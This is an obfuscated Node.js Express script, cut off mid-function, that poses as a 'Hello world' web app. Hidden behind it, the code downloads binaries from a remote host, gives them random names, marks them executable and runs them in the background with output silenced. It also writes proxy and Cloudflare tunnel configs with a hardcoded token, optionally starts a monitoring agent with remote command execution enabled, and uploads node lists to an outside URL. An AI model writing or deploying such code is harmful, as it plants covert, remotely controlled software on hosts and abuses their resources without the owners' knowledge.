const _0x1caaf0=_0x16f9;(function(_0x357081,_0x720241){const _0x13b019={_0x2fe99b:0xe1,_0x1fb9eb:0x138,_0x302bfb:0x134,_0x2fb950:0x173,_0x5726ef:0x15e},_0xeeb852=_0x16f9,_0x5547c0=_0x357081();while(!![]){try{const _0x47e3d9=-parseInt(_0xeeb852(_0x13b019._0x2fe99b))/0x1*(-parseInt(_0xeeb852(_0x13b019._0x1fb9eb))/0x2)+parseInt(_0xeeb852(0x128))/0x3+parseInt(_0xeeb852(0xe6))/0x4+-parseInt(_0xeeb852(_0x13b019._0x302bfb))/0x5+parseInt(_0xeeb852(0x17a))/0x6+-parseInt(_0xeeb852(_0x13b019._0x2fb950))/0x7+-parseInt(_0xeeb852(_0x13b019._0x5726ef))/0x8;if(_0x47e3d9===_0x720241)break;else _0x5547c0['push'](_0x5547c0['shift']());}catch(_0x534309){_0x5547c0['push'](_0x5547c0['shift']());}}}(_0x5272,0x63608));const express=require(_0x1caaf0(0x1a1)),app=express(),axios=require(_0x1caaf0(0xf4)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require('child_process')[_0x1caaf0(0x165)]),UPLOAD_URL=process[_0x1caaf0(0x108)][_0x1caaf0(0x19f)]||'',PROJECT_URL=process[_0x1caaf0(0x108)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x1caaf0(0x108)][_0x1caaf0(0xee)]||![],FILE_PATH=process[_0x1caaf0(0x108)][_0x1caaf0(0xd9)]||_0x1caaf0(0x149),SUB_PATH=process['env'][_0x1caaf0(0xe5)]||_0x1caaf0(0x100),PORT=process[_0x1caaf0(0x108)][_0x1caaf0(0xfe)]||process['env'][_0x1caaf0(0xff)]||0xbb8,UUID=process['env'][_0x1caaf0(0x145)]||_0x1caaf0(0x115),NEZHA_SERVER=process['env'][_0x1caaf0(0x19b)]||'',NEZHA_PORT=process['env']['NEZHA_PORT']||'',NEZHA_KEY=process[_0x1caaf0(0x108)][_0x1caaf0(0x16d)]||'',ARGO_DOMAIN=process[_0x1caaf0(0x108)][_0x1caaf0(0xdd)]||_0x1caaf0(0x10e),ARGO_AUTH=process[_0x1caaf0(0x108)][_0x1caaf0(0x147)]||_0x1caaf0(0x14c),ARGO_PORT=process['env'][_0x1caaf0(0x17d)]||0x1f41,CFIP=process[_0x1caaf0(0x108)][_0x1caaf0(0x104)]||'203.69.248.40',CFPORT=process[_0x1caaf0(0x108)][_0x1caaf0(0x129)]||0x3743,NAME=process[_0x1caaf0(0x108)][_0x1caaf0(0x151)]||'美国';!fs[_0x1caaf0(0x170)](FILE_PATH)?(fs[_0x1caaf0(0x19c)](FILE_PATH),console[_0x1caaf0(0x16f)](FILE_PATH+_0x1caaf0(0xda))):console[_0x1caaf0(0x16f)](FILE_PATH+'\x20already\x20exists');function _0x5272(){const _0x53e665=['stringify','Mozilla/5.0','boot.log','forEach','/api/add-nodes','Unhandled\x20error\x20in\x20startserver:','fileName','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','close','split','Error\x20executing\x20command:\x20','data','UUID','clear','ARGO_AUTH','chmod','.tmp','/vless-argo','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','eyJhIjoiMDIyMWUwYWI4ZWJiYjI3Mzg1YmViMjE0MGY3ZTllMjkiLCJ0IjoiNjVmOTkyMzQtMDY3MS00M2ZmLThjZTctNmU1YWFkMTc3ZGM0IiwicyI6IllUUTNORE0yWkdNdFl6UmlOUzAwWm1FeExUazRaakV0TnpFd1lUSm1OVGM1Wm1JNSJ9','tunnel.json','arch','vless','\x0a\x0atrojan://','NAME','false','readFile','Unknown','writeFileSync','isp','?security=tls&sni=','substring','/vmess-argo?ed=2560','\x20failed:\x20','App\x20is\x20running','Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','1613712vFobve','\x0a\x0avmess://','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','win32','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','/api/add-subscriptions','all','exec','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','Empowerment\x20failed\x20for\x20','send','country_code','tcp','none','basename','NEZHA_KEY','trojan','log','existsSync','config.yaml','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','2527483XwLDCr','\x20-c\x20','&path=%2Fvless-argo%3Fed%3D2560#','\x0avless://','countryCode','utf-8','get','2780160XLUaXI','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','post','ARGO_PORT','auto','length','true','test','arm','https://api.ip.sb/geoip','utf8','2083','text/plain;\x20charset=utf-8','https://oooo.serv00.net/add-url','replace','Error\x20reading\x20boot.log:','https://arm64.ssss.nyc.mn/v1','del\x20/f\x20/q\x20','application/json','quic','unlink','readdirSync','2096','\x0a\x20\x20credentials-file:\x20','ArgoDomain:','promises','http://ip-api.com/json','Content-Type','--tls','\x20>/dev/null\x202>&1\x20&','stream','match','Empowerment\x20success\x20for\x20','NEZHA_SERVER','mkdirSync','https://arm64.ssss.nyc.mn/bot','8443','UPLOAD_URL','\x0a\x20\x20tunnel:\x20','express','finish','FILE_PATH','\x20is\x20created','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','createWriteStream','ARGO_DOMAIN','\x20successfully','/trojan-argo','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','935ryYwjD','platform','https://amd64.ssss.nyc.mn/web','http\x20server\x20is\x20running\x20on\x20port:','SUB_PATH','203084DwDdXX','catch','block','isFile','unshift','nohup\x20','/config.json\x20>/dev/null\x202>&1\x20&','&path=%2Ftrojan-argo%3Fed%3D2560#','AUTO_ACCESS','\x20>/dev/null\x202>&1','\x20is\x20running','npm\x20running\x20error:\x20','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','config.json','axios','response','random','readFileSync','\x20>\x20nul\x202>&1','&fp=firefox&type=ws&host=','join','pop','from','then','SERVER_PORT','PORT','simba','/api/delete-nodes','floor','https://arm64.ssss.nyc.mn/web','CFIP','https://arm64.ssss.nyc.mn/agent','filter','http','env','Error\x20downloading\x20files:','php\x20running\x20error:\x20','abcdefghijklmnopqrstuvwxyz','127.0.0.1','arm64','us.lawkwan.eu.cc','includes','status','.exe\x20>\x20nul\x202>&1','automatic\x20access\x20task\x20added\x20successfully','index.html','freedom','83c1d760-da85-4d76-adb0-38047f3df557','charAt','443','\x0a\x20\x20\x20\x20','firefox','pipe','pkill\x20-f\x20\x22[','web\x20running\x20error:\x20','aarch64','org','toString','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','error','Download\x20','xtls-rprx-vision','listen','\x20-c\x20\x22','https://amd64.ssss.nyc.mn/agent','2053','1295934csaUsS','CFPORT','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','unlinkSync','tls','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','taskkill\x20/f\x20/im\x20','Subscription\x20uploaded\x20successfully','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/v1','push','1573740CHdgkl','base64','tunnel.yml','/sub.txt\x20saved\x20successfully','724PkEXHR'];_0x5272=function(){return _0x53e665;};return _0x5272();}function generateRandomName(){const _0x423439={_0x1b3798:0x10b,_0x38816b:0x116,_0x6da222:0x102},_0x33568a=_0x1caaf0,_0x278e5c=_0x33568a(_0x423439._0x1b3798);let _0x489837='';for(let _0x4c9c64=0x0;_0x4c9c64<0x6;_0x4c9c64++){_0x489837+=_0x278e5c[_0x33568a(_0x423439._0x38816b)](Math[_0x33568a(_0x423439._0x6da222)](Math[_0x33568a(0xf6)]()*_0x278e5c[_0x33568a(0x17f)]));}return _0x489837;}function _0x16f9(_0x300e88,_0x1d6925){const _0x5272c7=_0x5272();return _0x16f9=function(_0x16f9ac,_0x578ce2){_0x16f9ac=_0x16f9ac-0xd9;let _0x5abc4f=_0x5272c7[_0x16f9ac];return _0x5abc4f;},_0x16f9(_0x300e88,_0x1d6925);}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x1caaf0(0xfa)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1caaf0(0xfa)](FILE_PATH,botName),subPath=path[_0x1caaf0(0xfa)](FILE_PATH,'sub.txt'),listPath=path[_0x1caaf0(0xfa)](FILE_PATH,'list.txt'),bootLogPath=path[_0x1caaf0(0xfa)](FILE_PATH,_0x1caaf0(0x13b)),configPath=path['join'](FILE_PATH,_0x1caaf0(0xf3));function deleteNodes(){const _0x2c3bc8={_0x489872:0xf7,_0xf89a4f:0x178,_0x4ad096:0x178},_0x85be4a=_0x1caaf0;try{if(!UPLOAD_URL)return;if(!fs[_0x85be4a(0x170)](subPath))return;let _0x5bac90;try{_0x5bac90=fs[_0x85be4a(_0x2c3bc8._0x489872)](subPath,_0x85be4a(_0x2c3bc8._0xf89a4f));}catch{return null;}const _0x864016=Buffer[_0x85be4a(0xfc)](_0x5bac90,'base64')['toString'](_0x85be4a(_0x2c3bc8._0x4ad096)),_0x347e51=_0x864016[_0x85be4a(0x142)]('\x0a')['filter'](_0x55bd4b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x55bd4b));if(_0x347e51[_0x85be4a(0x17f)]===0x0)return;return axios[_0x85be4a(0x17c)](UPLOAD_URL+_0x85be4a(0x101),JSON[_0x85be4a(0x139)]({'nodes':_0x347e51}),{'headers':{'Content-Type':'application/json'}})[_0x85be4a(0xe7)](_0x50301e=>{return null;}),null;}catch(_0x2efb9a){return null;}}function cleanupOldFiles(){const _0x3cc3e7={_0x15ae0d:0x18f,_0x49602e:0x13c},_0x42032b={_0x45e6ae:0xfa,_0x2e517f:0x12c},_0x4677bb=_0x1caaf0;try{const _0xf72942=fs[_0x4677bb(_0x3cc3e7._0x15ae0d)](FILE_PATH);_0xf72942[_0x4677bb(_0x3cc3e7._0x49602e)](_0x824bc6=>{const _0x4754bc=_0x4677bb,_0x5e92b0=path[_0x4754bc(_0x42032b._0x45e6ae)](FILE_PATH,_0x824bc6);try{const _0x3cd8f1=fs['statSync'](_0x5e92b0);_0x3cd8f1[_0x4754bc(0xe9)]()&&fs[_0x4754bc(_0x42032b._0x2e517f)](_0x5e92b0);}catch(_0x2436e3){}});}catch(_0x3bfd7d){}}async function generateConfig(){const _0x21a0e0={_0x3f0ab0:0x16b,_0x2321b2:0x14f,_0x39afad:0x14a,_0x4db835:0xdf,_0x2303a6:0x10c,_0x294f04:0x14f,_0x2ee01f:0x16b,_0x6bcac6:0x18d,_0x1f9ad7:0x12d,_0x108b33:0x16e,_0x2a122:0xe8,_0x5c6aeb:0xfa},_0x5edaee=_0x1caaf0,_0x317fff={'log':{'access':'/dev/null','error':'/dev/null','loglevel':_0x5edaee(_0x21a0e0._0x3f0ab0)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5edaee(_0x21a0e0._0x2321b2),'settings':{'clients':[{'id':UUID,'flow':_0x5edaee(0x123)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x5edaee(_0x21a0e0._0x39afad),'dest':0xbba},{'path':'/vmess-argo','dest':0xbbb},{'path':_0x5edaee(_0x21a0e0._0x4db835),'dest':0xbbc}]},'streamSettings':{'network':_0x5edaee(0x16a)}},{'port':0xbb9,'listen':_0x5edaee(_0x21a0e0._0x2303a6),'protocol':_0x5edaee(0x14f),'settings':{'clients':[{'id':UUID}],'decryption':_0x5edaee(0x16b)},'streamSettings':{'network':'tcp','security':_0x5edaee(0x16b)}},{'port':0xbba,'listen':_0x5edaee(0x10c),'protocol':_0x5edaee(_0x21a0e0._0x294f04),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5edaee(_0x21a0e0._0x2ee01f)},'streamSettings':{'network':'ws','security':_0x5edaee(0x16b),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5edaee(0x107),'tls',_0x5edaee(_0x21a0e0._0x6bcac6)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5edaee(0x10c),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5edaee(_0x21a0e0._0x1f9ad7),_0x5edaee(0x18d)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5edaee(0x10c),'protocol':_0x5edaee(_0x21a0e0._0x108b33),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5edaee(_0x21a0e0._0x3f0ab0),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x5edaee(_0x21a0e0._0x6bcac6)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x5edaee(0x114),'tag':'direct'},{'protocol':'blackhole','tag':_0x5edaee(_0x21a0e0._0x2a122)}]};fs['writeFileSync'](path[_0x5edaee(_0x21a0e0._0x5c6aeb)](FILE_PATH,_0x5edaee(0xf3)),JSON['stringify'](_0x317fff,null,0x2));}function getSystemArchitecture(){const _0x3d8fed={_0x41bc43:0x14e,_0x214058:0x182,_0x3ec706:0x182},_0x119265=_0x1caaf0,_0x43ad03=os[_0x119265(_0x3d8fed._0x41bc43)]();return _0x43ad03===_0x119265(_0x3d8fed._0x214058)||_0x43ad03===_0x119265(0x10d)||_0x43ad03===_0x119265(0x11d)?_0x119265(_0x3d8fed._0x3ec706):'amd';}function downloadFile(_0x49b2e6,_0x48229b,_0x222978){const _0x18b3b7={_0x2d85fd:0x19c,_0x3fbe41:0xfd},_0x1cbd35={_0x4d725d:0x122,_0x339113:0x15a,_0x524891:0x121},_0x7c1e85={_0x364914:0x11a,_0x4d252b:0x121},_0x43dd85={_0x35cacc:0x141,_0x3277cf:0x16f,_0x361e4c:0x16c},_0x1d9320=_0x1caaf0,_0x394563=_0x49b2e6;!fs['existsSync'](FILE_PATH)&&fs[_0x1d9320(_0x18b3b7._0x2d85fd)](FILE_PATH,{'recursive':!![]});const _0x2a6061=fs[_0x1d9320(0xdc)](_0x394563);axios({'method':_0x1d9320(0x179),'url':_0x48229b,'responseType':_0x1d9320(0x198)})[_0x1d9320(_0x18b3b7._0x3fbe41)](_0x270e13=>{const _0x368744={_0x405f02:0x18e,_0x35a774:0x122,_0x1f3aaa:0x16c},_0x15a2e3=_0x1d9320;_0x270e13[_0x15a2e3(0x144)][_0x15a2e3(_0x7c1e85._0x364914)](_0x2a6061),_0x2a6061['on'](_0x15a2e3(0x1a2),()=>{const _0x4b1d17=_0x15a2e3;_0x2a6061[_0x4b1d17(_0x43dd85._0x35cacc)](),console[_0x4b1d17(_0x43dd85._0x3277cf)](_0x4b1d17(0x122)+path[_0x4b1d17(_0x43dd85._0x361e4c)](_0x394563)+_0x4b1d17(0xde)),_0x222978(null,_0x394563);}),_0x2a6061['on'](_0x15a2e3(_0x7c1e85._0x4d252b),_0x435443=>{const _0x353731=_0x15a2e3;fs[_0x353731(_0x368744._0x405f02)](_0x394563,()=>{});const _0x41a973=_0x353731(_0x368744._0x35a774)+path[_0x353731(_0x368744._0x1f3aaa)](_0x394563)+_0x353731(0x15a)+_0x435443['message'];console[_0x353731(0x121)](_0x41a973),_0x222978(_0x41a973);});})['catch'](_0x3937a7=>{const _0x4a14a3=_0x1d9320,_0x3777b9=_0x4a14a3(_0x1cbd35._0x4d725d)+path[_0x4a14a3(0x16c)](_0x394563)+_0x4a14a3(_0x1cbd35._0x339113)+_0x3937a7['message'];console[_0x4a14a3(_0x1cbd35._0x524891)](_0x3777b9),_0x222978(_0x3777b9);});}async function downloadFilesAndRun(){const _0x1cc6da={_0x1a3f4d:0x109,_0x21acc1:0x10f,_0x461c4c:0x142,_0x346960:0x190,_0x4e7a41:0x127,_0x4e74c6:0x180,_0x4d53b9:0x152,_0x15c7c3:0x125,_0x199bd1:0x162,_0x50e1ce:0x10a,_0x10b8cf:0x127,_0x218a4d:0x196,_0x151256:0xf1,_0x2095a2:0xeb,_0x55c314:0xec,_0x2dfe93:0xf0,_0x597ad1:0x12a,_0x475800:0x16f,_0x30c586:0x121,_0x4a0d06:0x143},_0x99907a=_0x1caaf0,_0x47726b=getSystemArchitecture(),_0x4249b7=getFilesForArchitecture(_0x47726b);if(_0x4249b7[_0x99907a(0x17f)]===0x0){console[_0x99907a(0x16f)](_0x99907a(0x172));return;}const _0x4038d1=_0x4249b7['map'](_0x1f401a=>{const _0x28db15={_0x29d9ec:0x13f};return new Promise((_0x4a3058,_0x575a04)=>{const _0x4878e8=_0x16f9;downloadFile(_0x1f401a[_0x4878e8(_0x28db15._0x29d9ec)],_0x1f401a['fileUrl'],(_0xf71462,_0x176428)=>{_0xf71462?_0x575a04(_0xf71462):_0x4a3058(_0x176428);});});});try{await Promise[_0x99907a(0x164)](_0x4038d1);}catch(_0x44ae93){console[_0x99907a(0x121)](_0x99907a(_0x1cc6da._0x1a3f4d),_0x44ae93);return;}function _0x4545e9(_0x226ecf){const _0x5f3b65={_0x1d660d:0x148},_0x5b99f0=0x1fd;_0x226ecf['forEach'](_0x2c0bf3=>{const _0xd06685={_0x40d445:0x167,_0x4e51ca:0x16f,_0x26703d:0x19a},_0x603b0d=_0x16f9;fs['existsSync'](_0x2c0bf3)&&fs[_0x603b0d(_0x5f3b65._0x1d660d)](_0x2c0bf3,_0x5b99f0,_0xfedbda=>{const _0x3afe0a=_0x603b0d;_0xfedbda?console['error'](_0x3afe0a(_0xd06685._0x40d445)+_0x2c0bf3+':\x20'+_0xfedbda):console[_0x3afe0a(_0xd06685._0x4e51ca)](_0x3afe0a(_0xd06685._0x26703d)+_0x2c0bf3+':\x20'+_0x5b99f0['toString'](0x8));});});}const _0x3a79b9=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4545e9(_0x3a79b9);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xabf4df=NEZHA_SERVER[_0x99907a(_0x1cc6da._0x21acc1)](':')?NEZHA_SERVER[_0x99907a(_0x1cc6da._0x461c4c)](':')[_0x99907a(0xfb)]():'',_0x1685b1=new Set([_0x99907a(0x117),_0x99907a(0x19e),_0x99907a(_0x1cc6da._0x346960),'2087',_0x99907a(0x185),_0x99907a(_0x1cc6da._0x4e7a41)]),_0x56119b=_0x1685b1['has'](_0xabf4df)?_0x99907a(_0x1cc6da._0x4e74c6):_0x99907a(_0x1cc6da._0x4d53b9),_0x3c963b='\x0aclient_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x99907a(0xdb)+_0x56119b+_0x99907a(0x15d)+UUID;fs['writeFileSync'](path['join'](FILE_PATH,_0x99907a(0x171)),_0x3c963b);const _0x3de8ed=_0x99907a(0xeb)+phpPath+_0x99907a(_0x1cc6da._0x15c7c3)+FILE_PATH+_0x99907a(_0x1cc6da._0x199bd1);try{await exec(_0x3de8ed),console[_0x99907a(0x16f)](phpName+'\x20is\x20running'),await new Promise(_0x1add9e=>setTimeout(_0x1add9e,0x3e8));}catch(_0x1b8ea3){console['error'](_0x99907a(_0x1cc6da._0x50e1ce)+_0x1b8ea3);}}else{let _0x3fe894='';const _0x4068b2=['443','8443',_0x99907a(0x190),'2087','2083',_0x99907a(_0x1cc6da._0x10b8cf)];_0x4068b2[_0x99907a(_0x1cc6da._0x21acc1)](NEZHA_PORT)&&(_0x3fe894=_0x99907a(_0x1cc6da._0x218a4d));const _0x22a246=_0x99907a(0xeb)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x3fe894+_0x99907a(0xf2);try{await exec(_0x22a246),console[_0x99907a(0x16f)](npmName+_0x99907a(0xf0)),await new Promise(_0x81a13c=>setTimeout(_0x81a13c,0x3e8));}catch(_0x100c28){console[_0x99907a(0x121)](_0x99907a(_0x1cc6da._0x151256)+_0x100c28);}}}else console[_0x99907a(0x16f)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2620c2=_0x99907a(_0x1cc6da._0x2095a2)+webPath+_0x99907a(0x174)+FILE_PATH+_0x99907a(_0x1cc6da._0x55c314);try{await exec(_0x2620c2),console['log'](webName+_0x99907a(_0x1cc6da._0x2dfe93)),await new Promise(_0x22b248=>setTimeout(_0x22b248,0x3e8));}catch(_0x5bbc32){console[_0x99907a(0x121)](_0x99907a(0x11c)+_0x5bbc32);}if(fs[_0x99907a(0x170)](botPath)){let _0x37b95a;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x37b95a=_0x99907a(0x131)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x37b95a=_0x99907a(_0x1cc6da._0x597ad1)+FILE_PATH+'/tunnel.yml\x20run':_0x37b95a=_0x99907a(0xe0)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x99907a(0xeb)+botPath+'\x20'+_0x37b95a+'\x20>/dev/null\x202>&1\x20&'),console[_0x99907a(_0x1cc6da._0x475800)](botName+'\x20is\x20running'),await new Promise(_0x42dca2=>setTimeout(_0x42dca2,0x7d0));}catch(_0x1032d7){console[_0x99907a(_0x1cc6da._0x30c586)](_0x99907a(_0x1cc6da._0x4a0d06)+_0x1032d7);}}await new Promise(_0x1d4cf0=>setTimeout(_0x1d4cf0,0x1388));}function getFilesForArchitecture(_0x23ffd9){const _0x31a4cf={_0x445da3:0x182,_0x27dac0:0x103,_0x1f5b46:0x19d,_0x3fe29f:0xe3,_0x142105:0x105,_0x468909:0x126,_0x33c1c3:0xea,_0x337b65:0x182},_0x19d4db=_0x1caaf0;let _0x417212;_0x23ffd9===_0x19d4db(_0x31a4cf._0x445da3)?_0x417212=[{'fileName':webPath,'fileUrl':_0x19d4db(_0x31a4cf._0x27dac0)},{'fileName':botPath,'fileUrl':_0x19d4db(_0x31a4cf._0x1f5b46)}]:_0x417212=[{'fileName':webPath,'fileUrl':_0x19d4db(_0x31a4cf._0x3fe29f)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x5c09ea=_0x23ffd9===_0x19d4db(0x182)?_0x19d4db(_0x31a4cf._0x142105):_0x19d4db(_0x31a4cf._0x468909);_0x417212[_0x19d4db(_0x31a4cf._0x33c1c3)]({'fileName':npmPath,'fileUrl':_0x5c09ea});}else{const _0xb58c26=_0x23ffd9===_0x19d4db(_0x31a4cf._0x337b65)?_0x19d4db(0x18a):_0x19d4db(0x132);_0x417212['unshift']({'fileName':phpPath,'fileUrl':_0xb58c26});}}return _0x417212;}function argoType(){const _0x129354={_0x3b3087:0x16f,_0x17facf:0x14b,_0x5be159:0x155,_0x16c574:0x14d,_0x519f4d:0x1a0,_0x99700f:0x191,_0x2e16e7:0x140,_0x1e5cd4:0x155},_0x593c0e=_0x1caaf0;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x593c0e(_0x129354._0x3b3087)](_0x593c0e(_0x129354._0x17facf));return;}if(ARGO_AUTH[_0x593c0e(0x10f)]('TunnelSecret')){fs[_0x593c0e(_0x129354._0x5be159)](path[_0x593c0e(0xfa)](FILE_PATH,_0x593c0e(_0x129354._0x16c574)),ARGO_AUTH);const _0xc93324=_0x593c0e(_0x129354._0x519f4d)+ARGO_AUTH['split']('\x22')[0xb]+_0x593c0e(_0x129354._0x99700f)+path['join'](FILE_PATH,'tunnel.json')+_0x593c0e(0x12e)+ARGO_DOMAIN+_0x593c0e(0x17b)+ARGO_PORT+_0x593c0e(_0x129354._0x2e16e7);fs[_0x593c0e(_0x129354._0x1e5cd4)](path[_0x593c0e(0xfa)](FILE_PATH,_0x593c0e(0x136)),_0xc93324);}else console[_0x593c0e(_0x129354._0x3b3087)](_0x593c0e(0x166));}async function extractDomains(){const _0x1b33f7={_0x267e15:0x13c,_0x2245e4:0x16f,_0x6f4326:0x143},_0x536321={_0x310186:0x13a,_0x448f7d:0x144,_0x1b1451:0x169,_0x4d95b4:0x144,_0x24addc:0x156,_0x55c141:0x144,_0x31d823:0x144,_0x518735:0x110,_0x5019ee:0x177,_0x486a80:0x11e,_0x350ba0:0x11e,_0x12bbf7:0x154},_0x5d14e6={_0x25e573:0xe2,_0x2c9459:0x12f,_0x64b23d:0x11b,_0x42cd6e:0x158},_0x539ad7={_0x54c48a:0x199,_0x1f1f61:0x133},_0x250690=_0x1caaf0;let _0x329012;if(ARGO_AUTH&&ARGO_DOMAIN)_0x329012=ARGO_DOMAIN,console[_0x250690(0x16f)]('ARGO_DOMAIN:',_0x329012),await _0x4877f4(_0x329012);else try{const _0x376614=fs['readFileSync'](path[_0x250690(0xfa)](FILE_PATH,_0x250690(0x13b)),'utf-8'),_0x5794ae=_0x376614[_0x250690(0x142)]('\x0a'),_0x9dea6c=[];_0x5794ae[_0x250690(_0x1b33f7._0x267e15)](_0x5e2a63=>{const _0x60e8ad=_0x250690,_0x9acbd=_0x5e2a63[_0x60e8ad(_0x539ad7._0x54c48a)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x9acbd){const _0x4c5042=_0x9acbd[0x1];_0x9dea6c[_0x60e8ad(_0x539ad7._0x1f1f61)](_0x4c5042);}});if(_0x9dea6c[_0x250690(0x17f)]>0x0)_0x329012=_0x9dea6c[0x0],console[_0x250690(0x16f)](_0x250690(0x192),_0x329012),await _0x4877f4(_0x329012);else{console[_0x250690(0x16f)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x250690(0x12c)](path[_0x250690(0xfa)](FILE_PATH,'boot.log'));async function _0x1a0a10(){const _0x28588a=_0x250690;try{process[_0x28588a(_0x5d14e6._0x25e573)]==='win32'?await exec(_0x28588a(_0x5d14e6._0x2c9459)+botName+_0x28588a(0x111)):await exec(_0x28588a(_0x5d14e6._0x64b23d)+botName[_0x28588a(0x116)](0x0)+']'+botName[_0x28588a(_0x5d14e6._0x42cd6e)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x3fb092){}}_0x1a0a10(),await new Promise(_0x2ca944=>setTimeout(_0x2ca944,0xbb8));const _0x3b140b='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x250690(0x120)+ARGO_PORT;try{await exec(_0x250690(0xeb)+botPath+'\x20'+_0x3b140b+_0x250690(0x197)),console[_0x250690(_0x1b33f7._0x2245e4)](botName+'\x20is\x20running'),await new Promise(_0x2c29da=>setTimeout(_0x2c29da,0xbb8)),await extractDomains();}catch(_0x540f67){console['error'](_0x250690(_0x1b33f7._0x6f4326)+_0x540f67);}}}catch(_0x3a5edd){console[_0x250690(0x121)](_0x250690(0x189),_0x3a5edd);}async function _0x9e89a2(){const _0x38e684=_0x250690;try{const _0xfe43cf=await axios[_0x38e684(0x179)](_0x38e684(0x183),{'headers':{'User-Agent':_0x38e684(_0x536321._0x310186),'timeout':0xbb8}});if(_0xfe43cf[_0x38e684(_0x536321._0x448f7d)]&&_0xfe43cf[_0x38e684(0x144)][_0x38e684(_0x536321._0x1b1451)]&&_0xfe43cf['data']['isp'])return(_0xfe43cf['data'][_0x38e684(_0x536321._0x1b1451)]+'-'+_0xfe43cf[_0x38e684(_0x536321._0x4d95b4)][_0x38e684(_0x536321._0x24addc)])[_0x38e684(0x188)](/\s+/g,'_');}catch(_0x5c435c){try{const _0x3fdcfc=await axios[_0x38e684(0x179)](_0x38e684(0x194),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x3fdcfc[_0x38e684(_0x536321._0x55c141)]&&_0x3fdcfc[_0x38e684(_0x536321._0x31d823)][_0x38e684(_0x536321._0x518735)]==='success'&&_0x3fdcfc['data'][_0x38e684(_0x536321._0x5019ee)]&&_0x3fdcfc[_0x38e684(_0x536321._0x31d823)][_0x38e684(_0x536321._0x486a80)])return(_0x3fdcfc['data'][_0x38e684(_0x536321._0x5019ee)]+'-'+_0x3fdcfc['data'][_0x38e684(_0x536321._0x350ba0)])['replace'](/\s+/g,'_');}catch(_0x2fd14e){}}return _0x38e684(_0x536321._0x12bbf7);}async function _0x4877f4(_0x21ef7c){const 